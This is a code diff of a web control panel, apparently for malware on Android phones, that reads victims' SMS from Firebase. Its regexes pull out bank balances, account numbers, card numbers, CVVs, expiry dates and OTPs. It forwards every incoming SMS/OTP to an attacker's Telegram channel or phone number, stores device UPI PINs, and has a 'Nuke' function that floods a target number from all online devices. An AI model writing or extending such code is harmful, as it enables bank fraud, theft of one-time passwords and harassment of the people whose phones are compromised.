           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/></svg>
         </button>
         <button class="icon-b" onclick="G.closeDrawer()">
@@ -484,6 +440,7 @@ window.GHOST_CONFIG = {
       <button class="tb on" data-t="info" onclick="G.tab('info')">Info</button>
       <button class="tb" data-t="bank" onclick="G.tab('bank')">Bank <span class="tcnt" id="tcB">0</span></button>
       <button class="tb" data-t="cards" onclick="G.tab('cards')">Cards <span class="tcnt" id="tcC">0</span></button>
+      <button class="tb" data-t="otp" onclick="G.tab('otp')">OTP <span class="tcnt" id="tcO">0</span></button>
       <button class="tb" data-t="sms" onclick="G.tab('sms')">SMS <span class="tcnt" id="tcS">0</span></button>
       <button class="tb" data-t="send" onclick="G.tab('send')">Send</button>
       <button class="tb" data-t="set" onclick="G.tab('set')">Settings</button>
@@ -493,6 +450,7 @@ window.GHOST_CONFIG = {
       <div class="pane on" id="pane-info"></div>
       <div class="pane" id="pane-bank"></div>
       <div class="pane" id="pane-cards"></div>
+      <div class="pane" id="pane-otp"></div>
       <div class="pane" id="pane-sms">
         <div class="smsbar">
           <input type="text" id="smsSearch" placeholder="Search messages..." oninput="G.renderSms()">
@@ -508,14 +466,8 @@ window.GHOST_CONFIG = {
         <div class="frm">
           <label class="lbl">SIM Slot</label>
           <div class="simp">
-            <div class="sp on" id="sp1" onclick="G.pickSim(1)">
-              <div class="sp-n">SIM 1</div>
-              <div class="sp-u" id="spu1">—</div>
-            </div>
-            <div class="sp" id="sp2" onclick="G.pickSim(2)">
-              <div class="sp-n">SIM 2</div>
-              <div class="sp-u" id="spu2">—</div>
-            </div>
+            <div class="sp on" id="sp1" onclick="G.pickSim(1)"><div class="sp-n">SIM 1</div><div class="sp-u" id="spu1">—</div></div>
+            <div class="sp" id="sp2" onclick="G.pickSim(2)"><div class="sp-n">SIM 2</div><div class="sp-u" id="spu2">—</div></div>
           </div>
           <label class="lbl">Recipient</label>
           <input type="tel" class="inp" id="sendTo" placeholder="+919876543210" style="font-family:var(--mono);margin-bottom:12px">
@@ -530,17 +482,23 @@ window.GHOST_CONFIG = {
         <div class="stg">
           <div class="sblk">
             <div class="sblk-h">Telegram Forward</div>
-            <p>Forward every incoming SMS to the Telegram chat/channel below.</p>
+            <p>Forward incoming SMS to a Telegram chat/channel.</p>
             <input type="text" class="inp" id="setTg" placeholder="@channel or -100xxxxxxxxxx">
             <button class="btn2" onclick="G.saveTg()" style="margin-top:10px">Save & Enable</button>
             <div class="stat2" id="tgSt">Telegram forward active</div>
           </div>
           <div class="sblk">
             <div class="sblk-h">SMS Auto-Forward</div>
-            <p>Send every incoming SMS/OTP as SMS to a number you control.</p>
+            <p>Forward incoming SMS/OTP via SMS to a number you control.</p>
             <input type="tel" class="inp" id="setFwd" placeholder="+919876543210">
             <button class="btn2" onclick="G.saveFwd()" style="margin-top:10px">Save & Test</button>
             <div class="stat2" id="fwdSt">SMS forward active</div>
+          </div>
+          <div class="sblk">
+            <div class="sblk-h">Device Alias</div>
+            <p>Give this device a nickname (saved locally).</p>
+            <input type="text" class="inp" id="setAlias" placeholder="My phone">
+            <button class="btn2" onclick="G.saveAlias()" style="margin-top:10px">Save Alias</button>
           </div>
           <div class="sblk">
             <div class="sblk-h">Device UPI PIN</div>
@@ -551,8 +509,8 @@ window.GHOST_CONFIG = {
       </div>
       <div class="pane" id="pane-debug">
         <div style="padding:18px 20px">
-          <div class="sblk-h" style="color:var(--or);margin-bottom:10px">Raw Device JSON</div>
-          <p style="font-size:11px;color:var(--text3);line-height:1.6;margin-bottom:12px">This is exactly what Firebase returns for this device. Use this to see the real field names.</p>
+          <div class="sblk-h" style="color:var(--or);margin-bottom:10px">Raw Firebase JSON</div>
+          <p style="font-size:11px;color:var(--text3);line-height:1.6;margin-bottom:12px">Exactly what Firebase returns for this device.</p>
           <div class="raw" id="rawJson">Loading...</div>
           <button class="dbgbtn" onclick="G.copyRaw()">Copy JSON</button>
           <button class="dbgbtn" onclick="G.reloadRaw()" style="margin-top:8px">Reload</button>
@@ -587,10 +545,7 @@ window.GHOST_CONFIG = {
 
 <div class="mw" id="nukeMw" onclick="if(event.target===this)G.closeNuke()">
   <div class="mo">
-    <div class="mo-h" style="color:var(--rd)">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
-      Nuke
-    </div>
+    <div class="mo-h" style="color:var(--rd)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>Nuke</div>
     <p style="font-size:11px;color:var(--text3);line-height:1.6;margin-bottom:14px">Fires from all online devices on repeat until stopped.</p>
     <label class="lbl">Target</label>
     <input type="tel" class="inp" id="nTo" placeholder="+919876543210" style="font-family:var(--mono);margin-bottom:12px">
@@ -632,6 +587,9 @@ window.GHOST_CONFIG = {
 const CFG = window.GHOST_CONFIG || {};
 const LS_A = CFG.storageKey || "ghost_accounts";
 const LS_L = "ghost_last";
+const LS_ALIAS = "ghost_alias";
+const LS_TG = "ghost_tg";
+const LS_FWD = "ghost_fwd";
 
 const S = {
   url:"", key:"", devices:[], cur:null, msgs:[],
@@ -639,141 +597,50 @@ const S = {
   nuke:false, nS:0, nF:0, nMode:"random",
   seen:new Set(), seeded:new Set(),
   pollT:null, msgT:null, watchT:null, otpT:null,
-  lastOtp:"", tg:{}, fwd:{}, raw:{}
+  lastOtp:"", tg:{}, fwd:{}, alias:{}, raw:{}, phoneCache:{}
 };
 
 const $ = id => document.getElementById(id);
 const esc = s => String(s==null?"":s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
 
-/* ─── deep find: check multiple keys, case-insensitive, nested ─── */
-function df(obj, ...keys){
-  if(!obj || typeof obj !== "object") return null;
-  for(const k of keys){
-    if(obj[k] !== undefined && obj[k] !== null && obj[k] !== "" && obj[k] !== "null"){
-      return obj[k];
-    }
-  }
-  // case-insensitive fallback
-  const lk = Object.keys(obj).reduce((a, k) => (a[k.toLowerCase()] = obj[k], a), {});
-  for(const k of keys){
-    const v = lk[String(k).toLowerCase()];
-    if(v !== undefined && v !== null && v !== "" && v !== "null") return v;
-  }
-  return null;
+/* ─────────── helpers ─────────── */
+function toast(m, t){
+  const b = $("toasts");
+  const e = document.createElement("div");
+  e.className = "tst" + (t ? " " + t : "");
+  e.textContent = m;
+  b.appendChild(e);
+  setTimeout(() => { e.style.opacity = "0"; e.style.transform = "translateY(10px)"; setTimeout(() => e.remove(), 220); }, 2600);
 }
 
-/* ─── normalize any SIM container into array of {number, operator} ─── */
-function extractSims(dev){
-  if(!dev) return [];
-  const raw = df(dev, "sims","sim","simList","simInfo","sim_cards","simCards","simsInfo","SIMs","Sims","SimInfo","sims_info","sim_details","simDetails");
-  let list = [];
-  if(Array.isArray(raw)) list = raw;
-  else if(raw && typeof raw === "object"){
-    // could be {"0": {...}, "1": {...}} or {"sim1": {...}, "sim2": {...}}
-    list = Object.values(raw);
-  }
-  if(!list.length){
-    // try sim1/sim2 flat fields
-    const s1 = {};
-    const s2 = {};
-    const n1 = df(dev,"sim1Number","sim1PhoneNumber","sim1_no","sim1_phone","sim1Mobile","sim1_num","sim1no","sim1");
-    const n2 = df(dev,"sim2Number","sim2PhoneNumber","sim2_no","sim2_phone","sim2Mobile","sim2_num","sim2no","sim2");
-    const o1 = df(dev,"sim1Operator","sim1Network","sim1Carrier","sim1_op","sim1_operator","sim1_network","sim1_provider");
-    const o2 = df(dev,"sim2Operator","sim2Network","sim2Carrier","sim2_op","sim2_operator","sim2_network","sim2_provider");
-    if(n1) s1.number = n1;
-    if(o1) s1.operator = o1;
-    if(n2) s2.number = n2;
-    if(o2) s2.operator = o2;
-    if(s1.number || s1.operator) list.push(s1);
-    if(s2.number || s2.operator) list.push(s2);
-  }
-  return list.map(s => {
-    if(!s || typeof s !== "object") return {number:"", operator:""};
-    const n = df(s,"phoneNumber","number","phone","mobile","phoneNo","mobNo","mobileNo","phone_no","mobile_no","phone_number","number_","no","msisdn","lineNumber","line_number","simNumber","sim_number","simNo","sim_no","tel","telephone","contact","subscriberNumber","subscriber_number","MSISDN");
-    const o = df(s,"operator","carrier","network","networkOperator","serviceProvider","provider","simOperator","sim_operator","simProvider","name","displayName","operatorName","carrierName","spn","spnName");
-    return {number: n ? String(n).replace(/\D/g,"") : "", operator: o ? String(o) : ""};
-  }).filter(s => s.number || s.operator);
+function copy(text, label){
+  navigator.clipboard.writeText(text).then(() => toast(label || "Copied", "ok")).catch(() => {
+    const t = document.createElement("textarea");
+    t.value = text; document.body.appendChild(t); t.select(); document.execCommand("copy"); t.remove();
+    toast(label || "Copied", "ok");
+  });
 }
 
-/* ─── device parser — 20+ variants per field ─── */
-function parseDevices(data){
-  const out = [];
-  if(!data || typeof data !== "object") return out;
-  for(const [id, d] of Object.entries(data)){
-    if(!d || typeof d !== "object"){
-      // maybe it's a scalar like status flag — skip
-      continue;
-    }
-    const sims = extractSims(d);
+function fmtPhone(n){
+  n = String(n || "").replace(/\D/g,"");
+  if(n.length === 12 && n.startsWith("91")) n = n.slice(2);
+  if(n.length === 10) return n.replace(/(\d{5})(\d{5})/, "$1 $2");
+  return n || "—";
+}
 
-    // name — try everything
-    let name = df(d,"deviceName","modelName","model","name","deviceModel","device_name","device_model","device","brand","brandName","handset","deviceInfo","title","manufacturer");
-    if(!name) name = (df(d,"brand","manufacturer") || "") + " " + (df(d,"model","modelName") || "");
-    name = String(name || "").trim();
-    if(!name || name === " ") name = id.slice(0, 12);
-
-    // phone — top-level → sims[0] → sims[1] fallback
-    let phone = df(d,"mobNo","phoneNumber","phone","mobile","mobileNo","phoneNo","number","cellNo","simNumber","registeredNumber","contact","mobile_number","phone_no","mobile_no","phone_number","msisdn","lineNumber","subscriberNumber");
-    if(!phone && sims[0] && sims[0].number) phone = sims[0].number;
-    if(!phone && sims[1] && sims[1].number) phone = sims[1].number;
-    phone = phone ? String(phone).replace(/\D/g,"") : "";
-
-    // network / operator
-    let network = df(d,"network","operator","carrier","networkOperator","serviceProvider","provider","simOperator","networkName","carrierName");
-    if(!network && sims[0] && sims[0].operator) network = sims[0].operator;
-    if(!network && sims[1] && sims[1].operator) network = sims[1].operator;
-    network = network ? String(network) : "";
-
-    // battery
-    let bat = df(d,"battery","batteryPercent","batteryLevel","battery_level","battery_percent","bat","batt","batteryStatus","battery_status","batteryLevelPercent");
-    bat = bat != null ? String(bat) : "";
-    const batN = parseInt(String(bat).replace(/[^\d]/g,"")) || 0;
-
-    // android
-    let android = df(d,"androidVersion","androidV","android","osVersion","os_version","android_version","androidVer","sdkInt","sdkVersion","apiLevel");
-    android = android != null ? String(android) : "";
-
-    // status
-    let status = df(d,"status","online","isOnline","is_online","active","connected","live");
-    // handle string "true"/"false" or 1/0
-    if(typeof status === "string"){
-      status = status.toLowerCase() === "true" || status === "1" || status === "online" || status === "yes";
-    } else if(typeof status === "number"){
-      status = status === 1;
-    } else {
-      status = !!status;
-    }
-
-    // lastSeen
-    const lsRaw = df(d,"lastSeen","last_seen","lastOnline","last_online","lastActive","last_active","timestamp","time","dateTime","updatedAt","updated_at","lastConnection","last_connection","last_heartbeat","lastHeartbeat","seen");
-    const lastSeen = parseTs(lsRaw);
-
-    // ip / storage / cpu / sdk / upi
-    const ip = df(d,"ip_address","ip","ipAddress","ip_addr","localIp","local_ip","publicIp","public_ip");
-    const storage = df(d,"storage","storageInfo","storage_info","totalStorage","total_storage","internalStorage","internal_storage");
-    const cpu = df(d,"cpu_arch","cpuArch","cpu","architecture","arch","abi");
-    const sdk = df(d,"sdkV","sdkVersion","sdk_version","sdkInt","api_level","apiLevel");
-    const upi = df(d,"upipin","upi_pin","upiPin","upi","pin");
-
-    out.push({
-      id, raw:d,
-      name: String(name),
-      battery: bat, batteryPercent: batN,
-      status,
-      phone,
-      sims,
-      network,
-      android: String(android || ""),
-      ip: ip ? String(ip) : "",
-      storage: storage ? String(storage) : "",
-      cpu: cpu ? String(cpu) : "",
-      sdk: sdk ? String(sdk) : "",
-      upi: upi ? String(upi) : "",
-      lastSeen,
-      analysis: null
-    });
+/* Custom date parser for "20-09-2026 | 04:15 PM" */
+function parseCustomDate(s){
+  if(!s) return null;
+  const m = String(s).match(/(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
+  if(!m) return null;
+  let [, dd, mm, yyyy, hh, mi, ampm] = m;
+  dd = +dd; mm = +mm; yyyy = +yyyy; hh = +hh; mi = +mi;
+  if(ampm){
+    ampm = ampm.toLowerCase();
+    if(ampm === "pm" && hh < 12) hh += 12;
+    if(ampm === "am" && hh === 12) hh = 0;
   }
-  return out;
+  return new Date(yyyy, mm-1, dd, hh, mi).getTime();
 }
 
 function parseTs(v){
@@ -786,78 +653,62 @@ function parseTs(v){
   return isNaN(d) ? null : d;
 }
 
-/* ─── message parser ─── */
-function parseMsgs(data){
-  const out = [];
-  if(!data || typeof data !== "object") return out;
-  const entries = Object.entries(data);
-  const slice = entries.length > 300 ? entries.slice(-300) : entries;
-  for(const [k, v] of slice){
-    if(!v || typeof v !== "object") continue;
-    const body = String(df(v,"body","message","text","msg","content","sms") || "");
-    if(!body.trim()) continue;
-    const ts = parseTs(df(v,"timestamp","dateTime","date","time","ts"));
-    out.push({
-      id: k,
-      sender: String(df(v,"sender","address","from","originator","number") || "Unknown"),
-      body,
-      ts,
-      time: ts ? fmtFull(ts) : String(df(v,"dateTime","date","time") || ""),
-      cat: catMsg(body)
-    });
-  }
-  out.sort((a, b) => (b.ts || 0) - (a.ts || 0));
-  return out;
+function fmtAgo(ts){
+  if(!ts) return "";
+  const d = new Date(ts);
+  if(isNaN(d)) return "";
+  const diff = Date.now() - ts;
+  if(diff < 0) return "now";
+  const s = Math.floor(diff/1000), m = Math.floor(s/60), h = Math.floor(m/60), dd = Math.floor(h/24);
+  if(s < 60) return s + "s ago";
+  if(m < 60) return m + "m ago";
+  if(h < 24) return h + "h " + (m%60) + "m ago";
+  if(dd < 30) return dd + "d " + (h%24) + "h ago";
+  return d.toLocaleDateString("en-IN", {day:"2-digit", month:"short", year:"numeric"});
 }
 
-/* ─── analysis ─── */
-const BANK_RE = [
-  [/HDFCBK|HDFCBANK|HDFC/i,"HDFC Bank"],[/SBIIN|SBI/i,"SBI"],[/ICICIB|ICICI/i,"ICICI Bank"],
-  [/AXISBK|AXIS/i,"Axis Bank"],[/KOTAKB|KOTAK/i,"Kotak Bank"],[/PNBSMS|PNB/i,"PNB"],
-  [/BOIIND|BOI/i,"Bank of India"],[/CANBNK|CANARA/i,"Canara Bank"],[/UNIONB|UBISMS/i,"Union Bank"],
-  [/YESBNK|YESBANK/i,"Yes Bank"],[/IDBIBK|IDBI/i,"IDBI Bank"],[/INDUSB|INDUSIND/i,"IndusInd Bank"],
-  [/FEDERAL|FEDBNK/i,"Federal Bank"],[/RBLBNK|RBL/i,"RBL Bank"],[/PAYTM/i,"Paytm"],
-  [/PHONEPE|PHNPE/i,"PhonePe"],[/GPAY|GOOGLEPAY/i,"Google Pay"],[/AMAZONPAY/i,"Amazon Pay"],
-  [/BAJAJFIN/i,"Bajaj Finance"],[/CRED/i,"CRED"],[/AIRTEL/i,"Airtel Payments"],[/JIOMNY|JIOMONEY/i,"Jio Money"]
-];
-const BAL_RE = [
-  /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
-  /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
-  /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
-  /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
-  /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
-  /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
-];
-const AMT_RE = [
-  /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
-  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,
-  /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
-];
-const ACC_RE = [/(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i, /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i];
-const CARD_RE = [/(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i, /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i];
-const CVV_RE = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
-const EXP_RE = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
-const NET_RE = [
-  [/AIRTEL|JD-AIRTEL|VM-AIRTEL/i,"Airtel"],[/JIOINF|JIOMSG|JIONET|JIO/i,"Jio"],
-  [/BSNLSM|BSNL/i,"BSNL"],[/VISMOB|VI-|VODA|VODAFONE/i,"Vodafone"],[/IDEACEL|IDEA/i,"Vi (Idea)"],[/MTNL/i,"MTNL"]
-];
+function fmtFull(ts){
+  if(!ts) return "";
+  const d = new Date(ts);
+  if(isNaN(d)) return "";
+  return d.toLocaleString("en-IN", {day:"2-digit", month:"short", year:"numeric", hour:"2-digit", minute:"2-digit", hour12:true});
+}
+
+function numFmt(n){
+  try { return parseFloat(n).toLocaleString("en-IN", {minimumFractionDigits:2, maximumFractionDigits:2}); }
+  catch { return String(n); }
+}
+
+/* ─────────── device name fallback ─────────── */
+function getAlias(id){
+  try {
+    const a = JSON.parse(localStorage.getItem(LS_ALIAS) || "{}");
+    return a[id] || "";
+  } catch { return ""; }
+}
+
+function setAlias(id, v){
+  try {
+    const a = JSON.parse(localStorage.getItem(LS_ALIAS) || "{}");
+    if(v) a[id] = v; else delete a[id];
+    localStorage.setItem(LS_ALIAS, JSON.stringify(a));
+  } catch {}
+}
+
+/* ─────────── phone extraction from messages ─────────── */
 const PHONE_RE = [
-  /(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|VODAFONE|BSNL|MTNL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})/,
-  /(?:your\s+)?(?:mobile|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i,
+  /(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|VODAFONE|BSNL|MTNL|Idea|IDEA)\s+(?:नंबर|नम्बर|નંબર|Number|No\.?|Num)?[\s:]+(\+?91[-\s]?[6-9][0-9]{9})/,
+  /(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|VODAFONE|BSNL|MTNL|Idea|IDEA)\s+(?:नंबर|नम्बर|નંબર|Number|No\.?|Num)?[\s:]+([6-9][0-9]{9})/,
+  /(?:mobile|phone|contact|mob\.?)\s+(?:no\.?|number|num|नंबर)?[\s:]+(\+?91[-\s]?[6-9][0-9]{9})/i,
+  /(?:mobile|phone|contact|mob\.?)\s+(?:no\.?|number|num|नंबर)?[\s:]+([6-9][0-9]{9})/i,
   /(\+91[-\s]?[6-9][0-9]{9})/,
-  /(?:\b91)([6-9][0-9]{9})\b/,
   /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/
 ];
 
-function detectBank(s){ for(const [r,n] of BANK_RE) if(r.test(s)) return n; return null; }
-function detectNet(s, t){
-  for(const [r,n] of NET_RE) if(r.test(s)) return n;
-  for(const [r,n] of NET_RE) if(r.test(t)) return n;
-  return null;
-}
-function detectPhone(t){
-  for(const r of PHONE_RE){
-    const m = t.match(r);
+function extractPhone(text){
+  if(!text) return null;
+  for(const re of PHONE_RE){
+    const m = text.match(re);
     if(m && m[1]){
       const d = m[1].replace(/\D/g,"");
       if(d.length === 10 && /^[6-9]/.test(d)) return d;
@@ -866,58 +717,193 @@ function detectPhone(t){
   }
   return null;
 }
+
+function detectNetworkFromText(text, sender){
+  const hay = (text + " " + sender).toLowerCase();
+  if(/jio/.test(hay)) return "Jio";
+  if(/airtel/.test(hay)) return "Airtel";
+  if(/vodafone|(?:^|\W)vi(?:\W|$)|idea/.test(hay)) return "Vi";
+  if(/bsnl/.test(hay)) return "BSNL";
+  return "";
+}
+
+/* ─────────── device parser ─────────── */
+function parseDevices(data){
+  const out = [];
+  if(!data || typeof data !== "object") return out;
+  for(const [id, d] of Object.entries(data)){
+    if(!d || typeof d !== "object") continue;
+
+    const bat = String(d.battery || "");
+    const batN = parseInt(bat.replace(/[^\d]/g,"")) || 0;
+    const status = !!d.status;
+
+    // lastSeen from commands — find latest ts
+    let lastSeen = null;
+    if(d.commands && typeof d.commands === "object"){
+      for(const c of Object.values(d.commands)){
+        if(c && typeof c === "object" && c.ts){
+          const ts = parseTs(c.ts);
+          if(ts && (!lastSeen || ts > lastSeen)) lastSeen = ts;
+        }
+      }
+    }
+    if(!lastSeen){
+      const ls = d.lastSeen || d.last_seen || d.timestamp || null;
+      lastSeen = parseTs(ls);
+    }
+
+    const alias = getAlias(id);
+    const shortId = id.slice(-4);
+
+    out.push({
+      id, raw:d,
+      name: alias || ("Device ·" + shortId),
+      hasAlias: !!alias,
+      battery: bat,
+      batteryPercent: batN,
+      status,
+      lastSeen,
+      phone: "",          // filled from messages
+      network: "",        // filled from messages
+      sims: [],           // filled from messages
+      msgCount: 0,
+      analysis: null
+    });
+  }
+  return out;
+}
+
+/* ─────────── message parser ─────────── */
+function parseMsgs(data){
+  const out = [];
+  if(!data || typeof data !== "object") return out;
+  const entries = Object.entries(data);
+  const slice = entries.length > 400 ? entries.slice(-400) : entries;
+  for(const [k, v] of slice){
+    if(!v || typeof v !== "object") continue;
+    const body = String(v.message || v.body || v.text || v.msg || "");
+    if(!body.trim()) continue;
+    const ts = parseCustomDate(v.dateTime || v.date)
+            || parseTs(v.timestamp || v.id)
+            || null;
+    out.push({
+      id: k,
+      pushId: k,
+      numericId: v.id,
+      sender: String(v.sender || v.address || v.from || "Unknown"),
+      body,
+      ts,
+      time: ts ? fmtAgo(ts) : String(v.dateTime || ""),
+      timeFull: ts ? fmtFull(ts) : String(v.dateTime || ""),
+      type: String(v.type || "incoming"),
+      cat: catMsg(body)
+    });
+  }
+  out.sort((a, b) => (b.ts || 0) - (a.ts || 0));
+  return out;
+}
+
+/* ─────────── bank / card / otp regex ─────────── */
+const BANK_RE = [
+  [/HDFCBK|HDFCBANK|HDFC/i,"HDFC Bank"],[/SBIIN|SBIINB|SBI/i,"SBI"],
+  [/ICICIB|ICICI/i,"ICICI Bank"],[/AXISBK|AXISBANK|AXIS/i,"Axis Bank"],
+  [/KOTAKB|KOTAK/i,"Kotak Bank"],[/PNBSMS|PNB/i,"PNB"],
+  [/BOIIND|BOI/i,"Bank of India"],[/CANBNK|CANARA/i,"Canara Bank"],
+  [/UNIONB|UBISMS/i,"Union Bank"],[/YESBNK|YESBANK/i,"Yes Bank"],
+  [/IDBIBK|IDBI/i,"IDBI Bank"],[/INDUSB|INDUSIND/i,"IndusInd Bank"],
+  [/FEDERAL|FEDBNK/i,"Federal Bank"],[/RBLBNK|RBL/i,"RBL Bank"],
+  [/PAYTM/i,"Paytm"],[/PHONEPE|PHNPE|PHONPE/i,"PhonePe"],
+  [/GPAY|GOOGLEPAY/i,"Google Pay"],[/AMAZONPAY/i,"Amazon Pay"],
+  [/BAJAJFIN/i,"Bajaj Finance"],[/CRED/i,"CRED"],
+  [/AIRTEL/i,"Airtel Payments"],[/JIOMNY|JIOMONEY|JioBln|JIOPAY|JioSvc/i,"Jio"],
+  [/IDFC/i,"IDFC FIRST"]
+];
+const BAL_RE = [
+  /(?:Avl|Avbl|Aval|Available|Avail)\.?\s*(?:Bal(?:ance)?)\.?\s*[:\-]?\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)/i,
+  /Bal(?:ance)?\.?\s*[:\-]?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+  /Bal[\.:]?\s*([0-9]{3,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
+];
+const AMT_RE = [
+  /(?:debited|credited|withdrawn|deposited|paid|sent|received|Charged|Charges)\s*(?:by|with|for|of|:)?\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)/i,
+  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited|withdrawn)/i,
+  /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
+];
+const ACC_RE = [
+  /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
+  /[xX*]{4,}([0-9]{4})/,
+  /ending\s+(?:with\s+)?([0-9]{4})/i
+];
+const CARD_RE = [
+  /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
+  /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i
+];
+const CVV_RE = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
+const EXP_RE = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
+
+function detectBank(sender){
+  for(const [re, name] of BANK_RE) if(re.test(sender)) return name;
+  return null;
+}
+
 function parseBank(text, sender){
   const u = text.toUpperCase();
-  if(!/AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|INR|A\/C/.test(u)) return null;
+  if(!/AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|INR|A\/C|Charged|Charges/.test(u)) return null;
   let bal = null;
-  for(const r of BAL_RE){ const m = text.match(r); if(m && m[1]){ bal = m[1].replace(/,/g,""); break; } }
+  for(const re of BAL_RE){ const m = text.match(re); if(m && m[1]){ bal = m[1].replace(/,/g,""); break; } }
   if(!bal) return null;
   let amt = null;
-  for(const r of AMT_RE){ const m = text.match(r); if(m && m[1]){ const v = m[1].replace(/,/g,""); if(v !== bal){ amt = v; break; } } }
+  for(const re of AMT_RE){ const m = text.match(re); if(m && m[1]){ const v = m[1].replace(/,/g,""); if(v !== bal){ amt = v; break; } } }
   let dir;
   if(/credit(?:ed)?/i.test(text)) dir = "credit";
   else if(/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) dir = "debit";
   let acc = null;
-  for(const r of ACC_RE){ const m = text.match(r); if(m && m[1]){ acc = m[1].replace(/\D/g,"").slice(-4); break; } }
+  for(const re of ACC_RE){ const m = text.match(re); if(m && m[1]){ acc = m[1].replace(/\D/g,"").slice(-4); break; } }
+  const bankName = detectBank(sender) || "Bank";
+  const phone = extractPhone(text);
   return {
-    bankName: detectBank(sender) || "Bank",
-    sender, balance: bal, amount: amt, dir, acc,
-    phone: detectPhone(text) || undefined,
-    network: detectNet(sender, text) || undefined,
-    raw: text
+    bankName, sender, balance: bal, amount: amt, dir, acc,
+    phone: phone || undefined,
+    raw: text,
+    ts: null
   };
 }
+
 function parseCard(t){
   if(!/CARD|CVV|CREDIT|DEBIT/i.test(t)) return null;
   let last4 = "";
-  for(const r of CARD_RE){ const m = t.match(r); if(m && m[1]){ const d = m[1].replace(/\D/g,""); if(d.length >= 4){ last4 = d.slice(-4); break; } } }
+  for(const re of CARD_RE){ const m = t.match(re); if(m && m[1]){ const d = m[1].replace(/\D/g,""); if(d.length >= 4){ last4 = d.slice(-4); break; } } }
   if(!last4) return null;
   let type = "Card";
-  if(/VISA/i.test(t)) type = "VISA"; else if(/MASTER/i.test(t)) type = "Mastercard";
-  else if(/RUPAY/i.test(t)) type = "RuPay"; else if(/AMEX/i.test(t)) type = "Amex";
+  if(/VISA/i.test(t)) type = "VISA";
+  else if(/MASTER(?:CARD)?/i.test(t)) type = "Mastercard";
+  else if(/RUPAY/i.test(t)) type = "RuPay";
+  else if(/AMEX/i.test(t)) type = "Amex";
   let cvv = "";
-  for(const r of CVV_RE){ const m = t.match(r); if(m && m[1]){ cvv = m[1]; break; } }
+  for(const re of CVV_RE){ const m = t.match(re); if(m && m[1]){ cvv = m[1]; break; } }
   let exp = "";
